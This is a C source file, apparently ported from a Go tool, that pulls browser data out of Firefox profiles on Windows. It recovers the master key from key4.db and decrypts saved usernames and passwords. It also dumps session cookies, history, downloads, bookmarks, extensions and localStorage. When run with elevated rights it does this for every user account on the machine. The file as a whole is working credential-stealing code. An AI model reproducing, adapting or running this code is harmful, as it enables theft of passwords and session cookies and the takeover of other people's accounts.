/*
 * Firefox browser data extraction — mirrors Go's browser/firefox.go
 *
 * Extracts: History, Cookies, Bookmarks, Login credentials
 * from Firefox profiles via key4.db + logins.json + places.sqlite + cookies.sqlite
 */
#include "browser/firefox.h"
#include "browser/utils.h"
#include "browser/sqlite.h"
#include "browser/crypto.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

/* ================================================================
 * Firefox Profile
 * ================================================================ */
typedef struct {
    char name[256];
    char path[MAX_PATH];
    char key4_db[MAX_PATH];
    char logins_json[MAX_PATH];
    char cookies_sqlite[MAX_PATH];
    char places_sqlite[MAX_PATH];
    char extensions_json[MAX_PATH];
    char webappsstore[MAX_PATH];
} FirefoxProfile;

static int g_profile_count = 0;
static FirefoxProfile g_profiles[128];

/* ================================================================
 * Profile discovery
 * ================================================================ */
static int collect_profiles(const char* profiles_dir) {
    int count = 0;
    char search[MAX_PATH];
    snprintf(search, sizeof(search), "%s\\*", profiles_dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        /* Firefox profiles typically end with .default or .default-release */
        const char* dot = strrchr(fd.cFileName, '.');
        if (!dot) continue;

        if (count >= 128) break;
        FirefoxProfile* p = &g_profiles[count];
        strncpy(p->name, fd.cFileName, sizeof(p->name) - 1);
        snprintf(p->path, sizeof(p->path), "%s\\%s", profiles_dir, fd.cFileName);
        snprintf(p->key4_db, sizeof(p->key4_db), "%s\\key4.db", p->path);
        snprintf(p->logins_json, sizeof(p->logins_json), "%s\\logins.json", p->path);
        snprintf(p->cookies_sqlite, sizeof(p->cookies_sqlite), "%s\\cookies.sqlite", p->path);
        snprintf(p->places_sqlite, sizeof(p->places_sqlite), "%s\\places.sqlite", p->path);
        snprintf(p->extensions_json, sizeof(p->extensions_json), "%s\\extensions.json", p->path);
        snprintf(p->webappsstore, sizeof(p->webappsstore), "%s\\webappsstore.sqlite", p->path);

        count++;
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

    return count;
}

/* Try to decrypt the first logins.json entry with this key — proves it is
 * the right master key when nssPrivate holds several candidates. */
static bool validate_key_with_logins(const uint8_t* key, int kl, const char* logins_path) {
    if (!logins_path || !path_exists(logins_path)) return false;
    int fl = 0;
    char* json = (char*)read_file(logins_path, &fl);
    if (!json) return false;
    bool ok = false;
    const char* p = strstr(json, "\"encryptedPassword\"");
    if (p) {
        const char* q = strchr(p, '"');
        /* find the value string start after the colon */
        const char* colon = strchr(p, ':');
        if (colon && colon < strchr(p + strlen(p), 0)) {
            const char* v = colon + 1;
            while (*v == ' ' || *v == '\t') v++;
            if (*v == '"') {
                v++;
                const char* e = strchr(v, '"');
                if (e && e > v) {
                    int bl = (int)(e - v);
                    uint8_t* raw = (uint8_t*)malloc(bl + 1);
                    int dl = base64_decode(v, raw, bl);
                    if (dl > 0) {
                        uint8_t dec[4096];
                        int dkl = 0;
                        if (firefox_decrypt_data(raw, dl, key, kl, dec, &dkl) == 0 && dkl > 0)
                            ok = true;
                    }
                    free(raw);
                }
            }
        }
        (void)q;
    }
    free(json);
    return ok;
}

/* Get Firefox master key from key4.db: verify password-check, then try every
 * nssPrivate candidate (a102 tag must match), validating each against the
 * profile's logins.json when available. Falls back to the first key that
 * decrypts when logins.json is absent. */
static uint8_t* get_firefox_master_key(const char* key4_path, const char* logins_path, int* key_len) {
    *key_len = 0;
    char tmp[MAX_PATH];
    if (create_tmp_file(key4_path, tmp, sizeof(tmp)) != 0) return NULL;

    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return NULL; }

    uint8_t *meta_item1 = NULL, *meta_item2 = NULL;
    int m1_len = 0, m2_len = 0;
    uint8_t* result = NULL;
    int result_len = 0;
    uint8_t* fallback = NULL;
    int fallback_len = 0;

    if (!sqlite_read_table(db, "metaData")) goto cleanup;

    int count = sqlite_get_row_count(db);
    for (int i = 0; i < count; i++) {
        const char* id = sqlite_get_value(db, i, "id");
        if (strcmp(id, "password") == 0) {
            const char* item1_b64 = sqlite_get_value(db, i, "item1");
            const char* item2_b64 = sqlite_get_value(db, i, "item2");
            int bl1 = (int)strlen(item1_b64), bl2 = (int)strlen(item2_b64);
            meta_item1 = (uint8_t*)malloc(bl1);
            meta_item2 = (uint8_t*)malloc(bl2);
            m1_len = base64_decode(item1_b64, meta_item1, bl1);
            m2_len = base64_decode(item2_b64, meta_item2, bl2);
            break;
        }
    }

    if (!meta_item1 || !meta_item2) goto cleanup;

    if (!sqlite_read_table(db, "nssPrivate")) goto cleanup;

    int rows = sqlite_get_row_count(db);
    for (int i = 0; i < rows && i < 16; i++) {
        const char* a11_b64 = sqlite_get_value(db, i, "a11");
        const char* a102_b64 = sqlite_get_value(db, i, "a102");
        if (!a11_b64 || !a102_b64 || !a11_b64[0] || !a102_b64[0]) continue;
        int bl1 = (int)strlen(a11_b64), bl2 = (int)strlen(a102_b64);
        uint8_t* a11 = (uint8_t*)malloc(bl1);
        uint8_t* a102 = (uint8_t*)malloc(bl2);
        int a11l = base64_decode(a11_b64, a11, bl1);
        int a102l = base64_decode(a102_b64, a102, bl2);

        int kl = 0;
        uint8_t* key = firefox_decrypt_master_key(meta_item1, m1_len, meta_item2, m2_len,
                                                  a11, a11l, a102, a102l, &kl);
        free(a11);
        free(a102);
        if (!key) continue;

        if (validate_key_with_logins(key, kl, logins_path)) {
            free(fallback);
            result = key;
            result_len = kl;
            break;
        }
        if (!fallback) {
            fallback = key;
            fallback_len = kl;
        } else {
            free(key);
        }
    }

    if (!result && fallback) {
        result = fallback;
        result_len = fallback_len;
    }
    if (result) *key_len = result_len;

cleanup:
    free(meta_item1); free(meta_item2);
    sqlite_close(db);
    remove_file(tmp);
    return result;
}

/* ================================================================
 * Simple JSON value extraction — "key":"value"
 * ================================================================ */
static char* json_value(const char* json, const char* key) {
    char pat[256];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = strstr(json, pat);
    if (!p) return NULL;
    p = strchr(p + strlen(pat), ':');
    if (!p) return NULL;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r') p++;
    if (*p != '"') return NULL;
    p++;
    const char* end = strchr(p, '"');
    if (!end) return NULL;
    /* Handle escaped quotes */
    while (end > p && *(end-1) == '\\') {
        end = strchr(end + 1, '"');
        if (!end) return NULL;
    }
    int len = (int)(end - p);
    char* r = (char*)malloc(len + 1);
    if (!r) return NULL;
    memcpy(r, p, len);
    r[len] = '\0';
    return r;
}

static int json_int(const char* json, const char* key) {
    char pat[256];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = strstr(json, pat);
    if (!p) return 0;
    p = strchr(p + strlen(pat), ':');
    if (!p) return 0;
    p++;
    while (*p == ' ' || *p == '\t') p++;
    return atoi(p);
}

/* ================================================================
 * Firefox Login extraction (logins.json)
 * ================================================================ */
static void firefox_extract_logins(const FirefoxProfile* profile, const uint8_t* master_key, int mk_len, StrBuilder* sb) {
    if (!path_exists(profile->logins_json)) {
        print_fail("logins.json not found", 1);
        return;
    }

    int fl;
    char* json = (char*)read_file(profile->logins_json, &fl);
    if (!json) {
        print_fail("Failed to read logins.json", 1);
        return;
    }

    print_verbose("Get Firefox Logins");

    /* Count logins by scanning for "hostname": entries */
    int login_count = 0;
    const char* scan = json;
    while ((scan = strstr(scan, "\"hostname\"")) != NULL) {
        login_count++;
        scan++;
    }
    sb_printf(sb, "  Found %d login(s)\n", login_count);

    /* Parse each login entry */
    const char* p = json;
    int found = 0;
    while ((p = strstr(p, "\"id\":")) != NULL && found < 2000) {
        /* Find the enclosing { } */
        const char* obj_start = p;
        while (obj_start > json && *obj_start != '{') obj_start--;
        const char* obj_end = strchr(obj_start, '}');
        if (!obj_end) { p++; continue; }
        int obj_len = (int)(obj_end - obj_start) + 1;
        char* obj = (char*)malloc(obj_len + 1);
        memcpy(obj, obj_start, obj_len);
        obj[obj_len] = '\0';

        char* hostname = json_value(obj, "hostname");
        char* enc_user = json_value(obj, "encryptedUsername");
        char* enc_pass = json_value(obj, "encryptedPassword");
        int form_submit = json_int(obj, "formSubmitURL");

        char username[512] = "";
        char password[512] = "";

        if (enc_user && enc_user[0]) {
            int bl = (int)strlen(enc_user);
            uint8_t* raw = (uint8_t*)malloc(bl);
            int dl = base64_decode(enc_user, raw, bl);
            if (dl > 0 && master_key) {
                uint8_t dec[4096]; int dkl;
                if (firefox_decrypt_data(raw, dl, master_key, mk_len, dec, &dkl) == 0) {
                    if (dkl < (int)sizeof(username)) {
                        memcpy(username, dec, dkl);
                        username[dkl] = '\0';
                    }
                }
            }
            free(raw);
        }

        if (enc_pass && enc_pass[0]) {
            int bl = (int)strlen(enc_pass);
            uint8_t* raw = (uint8_t*)malloc(bl);
            int dl = base64_decode(enc_pass, raw, bl);
            if (dl > 0 && master_key) {
                uint8_t dec[4096]; int dkl;
                if (firefox_decrypt_data(raw, dl, master_key, mk_len, dec, &dkl) == 0) {
                    if (dkl < (int)sizeof(password)) {
                        memcpy(password, dec, dkl);
                        password[dkl] = '\0';
                    }
                }
            }
            free(raw);
        }

        if (hostname) {
            sb_printf(sb, "    ---------------------------------------------------------\n");
            sb_printf(sb, "    [+] URL: %s\n", hostname);
            sb_printf(sb, "    [+] USERNAME: %s\n", username[0] ? username : "(empty)");
            sb_printf(sb, "    [+] PASSWORD: %s\n", password[0] ? password : "(empty)");
            if (form_submit) sb_printf(sb, "    [*] Form Submit URL\n");

        }

        free(hostname);
        free(enc_user);
        free(enc_pass);
        free(obj);
        p = obj_end + 1;
        found++;
    }

    free(json);
}

/* ================================================================
 * Firefox Cookie extraction (cookies.sqlite)
 * ================================================================ */
static void firefox_extract_cookies(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->cookies_sqlite)) {
        print_fail("cookies.sqlite not found", 1);
        return;
    }

    char tmp[MAX_PATH];
    if (create_tmp_file(profile->cookies_sqlite, tmp, sizeof(tmp)) != 0) {
        print_fail("Failed to copy cookies.sqlite", 1);
        return;
    }

    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return; }

    print_verbose("Get Firefox Cookies");

    if (sqlite_read_table(db, "moz_cookies")) {
        int count = sqlite_get_row_count(db);
        sb_printf(sb, "  Found %d cookie(s)\n", count);
        int shown = 0;

        for (int i = 0; i < count && shown < 500; i++) {
            const char* host = sqlite_get_value(db, i, "host");
            const char* name = sqlite_get_value(db, i, "name");
            const char* value = sqlite_get_value(db, i, "value");
            const char* path = sqlite_get_value(db, i, "path");
            const char* expiry_str = sqlite_get_value(db, i, "expiry");
            const char* is_secure = sqlite_get_value(db, i, "isSecure");

            if (host && name && value) {
                sb_printf(sb, "    ---------------------------------------------------------\n");
                sb_printf(sb, "    [+] HOST: %s\n", host);
                sb_printf(sb, "    [+] COOKIE: %s=%s\n", name, value);
                sb_printf(sb, "    [+] Path: %s\n", path ? path : "/");
                sb_printf(sb, "    [+] Expiry: %s | Secure: %s\n",
                         expiry_str ? expiry_str : "0",
                         (is_secure && strcmp(is_secure, "1") == 0) ? "true" : "false");
                shown++;
            }
        }
    } else {
        print_fail("moz_cookies table not found", 1);
    }

    sqlite_close(db);
    remove_file(tmp);
}

/* ================================================================
 * Firefox History extraction (places.sqlite → moz_places)
 * ================================================================ */
static void firefox_extract_history(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->places_sqlite)) {
        print_fail("places.sqlite not found", 1);
        return;
    }

    char tmp[MAX_PATH];
    if (create_tmp_file(profile->places_sqlite, tmp, sizeof(tmp)) != 0) {
        print_fail("Failed to copy places.sqlite", 1);
        return;
    }

    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return; }

    print_verbose("Get Firefox History");

    if (sqlite_read_table(db, "moz_places")) {
        int count = sqlite_get_row_count(db);
        sb_printf(sb, "  Found %d history entry(s)\n", count);
        int shown = 0;

        for (int i = 0; i < count && shown < 500; i++) {
            const char* url = sqlite_get_value(db, i, "url");
            const char* title = sqlite_get_value(db, i, "title");
            const char* visit_count_str = sqlite_get_value(db, i, "visit_count");
            const char* last_date_str = sqlite_get_value(db, i, "last_visit_date");

            if (url && url[0]) {
                int64_t last_date = atoll(last_date_str ? last_date_str : "0");
                char date_str[64] = "";
                if (last_date > 0) time_epoch_str(last_date, date_str, sizeof(date_str));

                sb_printf(sb, "    ---------------------------------------------------------\n");
                sb_printf(sb, "    [+] URL: %s\n", url);
                sb_printf(sb, "    [+] TITLE: %s\n", title && title[0] ? title : "(no title)");
                sb_printf(sb, "    [+] Visit Count: %s | Last Visit: %s\n",
                         visit_count_str ? visit_count_str : "0",
                         date_str[0] ? date_str : "unknown");
                shown++;
            }
        }
    } else {
        print_fail("moz_places table not found", 1);
    }

    sqlite_close(db);
    remove_file(tmp);
}

/* ================================================================
 * Firefox Bookmark extraction (places.sqlite → moz_bookmarks + moz_places)
 * ================================================================ */
static void firefox_extract_bookmarks(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->places_sqlite)) {
        print_fail("places.sqlite not found (bookmarks)", 1);
        return;
    }

    char tmp[MAX_PATH];
    if (create_tmp_file(profile->places_sqlite, tmp, sizeof(tmp)) != 0) return;

    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return; }
    /* second connection for moz_places: re-reading it inside the bookmark
     * loop would evict the resident moz_bookmarks rows (UAF) and cost
     * O(B x P) rereads */
    SQLiteHandler* places_db = sqlite_open(tmp);

    print_verbose("Get Firefox Bookmarks");

    if (sqlite_read_table(db, "moz_bookmarks")) {
        if (places_db) sqlite_read_table(places_db, "moz_places");
        int count = sqlite_get_row_count(db);
        sb_printf(sb, "  Found %d bookmark(s)\n", count);
        int shown = 0;

        for (int i = 0; i < count && shown < 500; i++) {
            const char* type_str = sqlite_get_value(db, i, "type");
            const char* title = sqlite_get_value(db, i, "title");
            const char* fk_str = sqlite_get_value(db, i, "fk");

            /* type=1 means bookmark (URL), type=2 means folder */
            if (type_str && strcmp(type_str, "1") == 0 && title && title[0] && fk_str) {
                int fk = atoi(fk_str);
                if (fk > 0) {
                    /* Look up the URL in the preloaded moz_places */
                    {
                        int pc = places_db ? sqlite_get_row_count(places_db) : 0;
                        const char* url = NULL;
                        for (int j = 0; j < pc; j++) {
                            const char* id_str = sqlite_get_value(places_db, j, "id");
                            if (id_str && atoi(id_str) == fk) {
                                url = sqlite_get_value(places_db, j, "url");
                                break;
                            }
                        }
                        sb_printf(sb, "    ---------------------------------------------------------\n");
                        sb_printf(sb, "    [+] TITLE: %s\n", title);
                        sb_printf(sb, "    [+] URL: %s\n", url ? url : "(unknown)");

                        shown++;
                    }
                }
            }
        }
    } else {
        print_fail("moz_bookmarks table not found", 1);
    }

    sqlite_close(places_db);
    sqlite_close(db);
    remove_file(tmp);
}

/* ================================================================
 * Firefox downloads (places.sqlite: moz_annos JOIN moz_places)
 * content format: "target_path,{json}" with fileSize / endTime
 * ================================================================ */
static void ff_json_num(const char* json, const char* key, long long* out) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char* p = strstr(json, pat);
    if (!p) return;
    p = strchr(p + strlen(pat), ':');
    if (!p) return;
    *out = atoll(p + 1);
}

/* Firefox timestamps: microseconds (places) / milliseconds (annos JSON) */
static void ff_time_str(long long micros, char* out, int out_sz) {
    if (micros <= 0) { snprintf(out, out_sz, "unknown"); return; }
    time_t t = (time_t)(micros / 1000000);
    struct tm tm_buf;
    if (localtime_s(&tm_buf, &t) != 0) { snprintf(out, out_sz, "unknown"); return; }
    strftime(out, out_sz, "%Y-%m-%d %H:%M:%S", &tm_buf);
}

static void firefox_extract_downloads(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->places_sqlite)) return;

    char tmp[MAX_PATH];
    if (create_tmp_file(profile->places_sqlite, tmp, sizeof(tmp)) != 0) return;

    SQLiteHandler* annos = sqlite_open(tmp);
    SQLiteHandler* places = annos ? sqlite_open(tmp) : NULL;
    if (!annos || !places) { sqlite_close(annos); remove_file(tmp); return; }

    if (sqlite_read_table(annos, "moz_annos") && sqlite_read_table(places, "moz_places")) {
        int ac = sqlite_get_row_count(annos);
        int pc = sqlite_get_row_count(places);
        int shown = 0;
        for (int i = 0; i < ac && shown < 500; i++) {
            const char* place_id = sqlite_get_value(annos, i, "place_id");
            const char* content = sqlite_get_value(annos, i, "content");
            const char* date_added = sqlite_get_value(annos, i, "dateAdded");
            if (!place_id || !content || !content[0]) continue;

            /* resolve URL: moz_annos.place_id == moz_places.id */
            const char* url = "";
            for (int j = 0; j < pc; j++) {
                const char* pid = sqlite_get_value(places, j, "id");
                if (pid && strcmp(pid, place_id) == 0) {
                    url = sqlite_get_value(places, j, "url");
                    break;
                }
            }

            /* content = "target_path,{json}" */
            char target[1024] = {0};
            long long file_size = 0, end_millis = 0;
            const char* jsep = strstr(content, ",{");
            if (jsep) {
                int tl = (int)(jsep - content);
                if (tl >= (int)sizeof(target)) tl = sizeof(target) - 1;
                memcpy(target, content, tl);
                ff_json_num(jsep + 1, "fileSize", &file_size);
                ff_json_num(jsep + 1, "endTime", &end_millis);
            } else {
                snprintf(target, sizeof(target), "%s", content);
            }

            char start_str[64], end_str[64];
            ff_time_str(atoll(date_added ? date_added : "0") * 1000, start_str, sizeof(start_str));
            ff_time_str(end_millis * 1000, end_str, sizeof(end_str));

            sb_printf(sb, "    ---------------------------------------------------------\n");
            sb_printf(sb, "    [+] URL: %s\n", url[0] ? url : "(unknown)");
            sb_printf(sb, "    [+] TARGET: %s\n", target);
            if (file_size > 0) sb_printf(sb, "    [+] SIZE: %lld bytes\n", file_size);
            sb_printf(sb, "    [+] Start: %s | End: %s\n", start_str, end_str);
            shown++;
        }
    }

    sqlite_close(annos);
    if (places) sqlite_close(places);
    remove_file(tmp);
}

/* ================================================================
 * Firefox extensions (extensions.json, "addons"[] with
 * location == "app-profile" = user-installed)
 * ================================================================ */
static const char* ff_json_obj_end(const char* obj) {
    int depth = 0, in_str = 0, esc = 0;
    for (const char* p = obj; *p; p++) {
        char c = *p;
        if (in_str) {
            if (esc) esc = 0;
            else if (c == '\\') esc = 1;
            else if (c == '"') in_str = 0;
            continue;
        }
        if (c == '"') in_str = 1;
        else if (c == '{') depth++;
        else if (c == '}' && --depth == 0) return p + 1;
    }
    return NULL;
}

static int ff_json_str_in(const char* start, const char* end, const char* key, char* out, int out_sz) {
    char pat[128];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    for (const char* p = start; p + strlen(pat) <= end; p++) {
        if (memcmp(p, pat, strlen(pat)) != 0) continue;
        const char* q = p + strlen(pat);
        while (q < end && (*q == ' ' || *q == ':')) q++;
        if (q >= end || *q != '"') continue;
        q++;
        int n = 0;
        while (q < end && *q && *q != '"' && n < out_sz - 1) {
            if (*q == '\\' && q[1]) q++;
            out[n++] = *q++;
        }
        out[n] = 0;
        return n > 0;
    }
    return 0;
}

static void firefox_extract_extensions(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->extensions_json)) return;

    int fl = 0;
    char* json = (char*)read_file(profile->extensions_json, &fl);
    if (!json) return;

    const char* addons = strstr(json, "\"addons\"");
    if (!addons) { free(json); return; }
    const char* arr = strchr(addons, '[');
    if (!arr) { free(json); return; }

    int shown = 0;
    const char* p = arr + 1;
    while (shown < 200) {
        const char* obj = strchr(p, '{');
        if (!obj) break;
        const char* obj_end = ff_json_obj_end(obj);
        if (!obj_end) break;

        char location[64] = {0}, id[256] = {0}, version[64] = {0}, active[32] = {0};
        ff_json_str_in(obj, obj_end, "location", location, sizeof(location));
        ff_json_str_in(obj, obj_end, "id", id, sizeof(id));
        ff_json_str_in(obj, obj_end, "version", version, sizeof(version));

        /* only user-installed extensions (XPIDatabase location app-profile) */
        if (strcmp(location, "app-profile") == 0 && id[0]) {
            char name[256] = {0}, desc[512] = {0}, home[256] = {0};
            const char* dl = strstr(obj, "\"defaultLocale\"");
            if (dl && dl < obj_end) {
                const char* dlobj = strchr(dl, '{');
                if (dlobj && dlobj < obj_end) {
                    const char* dle = ff_json_obj_end(dlobj);
                    if (dle && dle <= obj_end) {
                        ff_json_str_in(dlobj, dle, "name", name, sizeof(name));
                        ff_json_str_in(dlobj, dle, "description", desc, sizeof(desc));
                        ff_json_str_in(dlobj, dle, "homepageURL", home, sizeof(home));
                    }
                }
            }
            const char* act = strstr(obj, "\"active\"");
            bool enabled = false;
            if (act && act < obj_end) {
                const char* v = strchr(act, ':');
                if (v) { v++; while (*v == ' ') v++; enabled = strncmp(v, "true", 4) == 0; }
            }

            sb_printf(sb, "    ---------------------------------------------------------\n");
            sb_printf(sb, "    [+] NAME: %s\n", name[0] ? name : "(unknown)");
            sb_printf(sb, "    [+] ID: %s\n", id);
            sb_printf(sb, "    [+] VERSION: %s\n", version);
            sb_printf(sb, "    [+] ENABLED: %s\n", enabled ? "true" : "false");
            if (desc[0]) sb_printf(sb, "    [+] DESCRIPTION: %s\n", desc);
            if (home[0]) sb_printf(sb, "    [+] HOMEPAGE: %s\n", home);
            shown++;
        }
        p = obj_end;
    }
    free(json);
}

/* ================================================================
 * Firefox localStorage (webappsstore.sqlite: webappsstore2)
 * originKey format is reversed: "moc.buhtig.:https:443"
 *   -> https://github.com:443
 * ================================================================ */
static void ff_reverse(const char* in, char* out, int out_sz) {
    int l = (int)strlen(in);
    if (l >= out_sz) l = out_sz - 1;
    for (int i = 0; i < l; i++) out[i] = in[l - 1 - i];
    out[l] = 0;
}

static void ff_parse_origin_key(const char* origin_key, char* out, int out_sz) {
    /* originKey format: "moc.buhtig.:https:443" -> https://github.com:443 */
    char host_rev[384] = {0}, scheme[64] = {0}, port[32] = {0};
    const char* c1 = strchr(origin_key, ':');
    if (!c1) { snprintf(out, out_sz, "%s", origin_key); return; }
    int hl = (int)(c1 - origin_key);
    if (hl >= (int)sizeof(host_rev)) hl = sizeof(host_rev) - 1;
    memcpy(host_rev, origin_key, hl);
    const char* rest = c1 + 1;
    const char* c2 = strchr(rest, ':');
    if (c2) {
        snprintf(scheme, sizeof(scheme), "%.*s", (int)(c2 - rest), rest);
        snprintf(port, sizeof(port), "%s", c2 + 1);
    } else {
        snprintf(scheme, sizeof(scheme), "%s", rest);
    }
    char host[384];
    ff_reverse(host_rev, host, sizeof(host));
    if (host[0] == '.') memmove(host, host + 1, strlen(host));
    if (port[0])
        snprintf(out, out_sz, "%s://%s:%s", scheme, host, port);
    else
        snprintf(out, out_sz, "%s://%s", scheme, host);
}

static void firefox_extract_localstorage(const FirefoxProfile* profile, StrBuilder* sb) {
    if (!path_exists(profile->webappsstore)) return;

    char tmp[MAX_PATH];
    if (create_tmp_file(profile->webappsstore, tmp, sizeof(tmp)) != 0) return;

    SQLiteHandler* db = sqlite_open(tmp);
    if (!db) { remove_file(tmp); return; }

    if (sqlite_read_table(db, "webappsstore2")) {
        int count = sqlite_get_row_count(db);
        int shown = 0;
        for (int i = 0; i < count && shown < 500; i++) {
            const char* origin = sqlite_get_value(db, i, "originKey");
            const char* key = sqlite_get_value(db, i, "key");
            const char* value = sqlite_get_value(db, i, "value");
            if (!origin || !origin[0]) continue;
            char url[512];
            ff_parse_origin_key(origin, url, sizeof(url));
            sb_printf(sb, "    ---------------------------------------------------------\n");
            sb_printf(sb, "    [+] URL: %s\n", url);
            sb_printf(sb, "    [+] KEY: %s\n", key ? key : "");
            sb_printf(sb, "    [+] VALUE: %.200s\n", value ? value : "");
            shown++;
        }
    }

    sqlite_close(db);
    remove_file(tmp);
}

/* ================================================================
 * Per-profile extraction
 * ================================================================ */
static void extract_profile_data(const FirefoxProfile* profile, const char* user, StrBuilder* sb) {
    sb_printf(sb, "\n---------- Profile: %s ----------\n", profile->name);

    /* Get master key for this profile (validated against logins.json) */
    int mk_len = 0;
    uint8_t* mk = NULL;
    if (path_exists(profile->key4_db)) {
        mk = get_firefox_master_key(profile->key4_db, profile->logins_json, &mk_len);
        if (mk) {
            print_verbose("Firefox master key obtained");
        } else {
            print_fail("Failed to get Firefox master key (login decryption may fail)", 1);
        }
    }

    /* Logins */
    firefox_extract_logins(profile, mk, mk_len, sb);

    /* Cookies */
    firefox_extract_cookies(profile, sb);

    /* History */
    firefox_extract_history(profile, sb);

    /* Downloads */
    firefox_extract_downloads(profile, sb);

    /* Bookmarks */
    firefox_extract_bookmarks(profile, sb);

    /* Extensions */
    firefox_extract_extensions(profile, sb);

    /* LocalStorage */
    firefox_extract_localstorage(profile, sb);

    free(mk);
    (void)user;
}

/* ================================================================
 * Main Firefox extraction entry point
 * ================================================================ */
const char* firefox_get(void) {
    static StrBuilder sb;
    sb_init(&sb);

    if (g_format[0] != '\0') g_print_out = false;

    if (is_high_integrity()) {
        char sys_drive[8];
        GetEnvironmentVariableA("SystemDrive", sys_drive, sizeof(sys_drive));
        char users_path[MAX_PATH];
        snprintf(users_path, sizeof(users_path), "%s\\Users", sys_drive);

        WIN32_FIND_DATAA fd;
        char search[MAX_PATH];
        snprintf(search, sizeof(search), "%s\\*", users_path);
        HANDLE hFind = FindFirstFileA(search, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                if (fd.cFileName[0] == '.') continue;
                if (strcmp(fd.cFileName, "All Users") == 0 ||
                    strcmp(fd.cFileName, "Public") == 0 ||
                    strcmp(fd.cFileName, "Default") == 0) continue;

                char profile_dir[MAX_PATH];
                snprintf(profile_dir, sizeof(profile_dir),
                         "%s\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                         users_path, fd.cFileName);
                int n = collect_profiles(profile_dir);
                if (n == 0) continue;

                sb_printf(&sb, "========================== Firefox (%s) ==========================\n", fd.cFileName);

                for (int i = 0; i < n; i++) {
                    extract_profile_data(&g_profiles[i], fd.cFileName, &sb);
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    } else {
        char profile_dir[MAX_PATH];
        char user_profile[MAX_PATH];
        GetEnvironmentVariableA("USERPROFILE", user_profile, sizeof(user_profile));
        snprintf(profile_dir, sizeof(profile_dir),
                 "%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", user_profile);
        int n = collect_profiles(profile_dir);
        if (n > 0) {
            sb_printf(&sb, "========================== Firefox (Current User) ==========================\n");

            for (int i = 0; i < n; i++) {
                extract_profile_data(&g_profiles[i], "Current User", &sb);
            }
        } else {
            sb_printf(&sb, "  No Firefox profiles found.\n");
        }
    }

    /* Restore print output */
    if (g_format[0] != '\0') g_print_out = true;

    return sb_str(&sb);
}
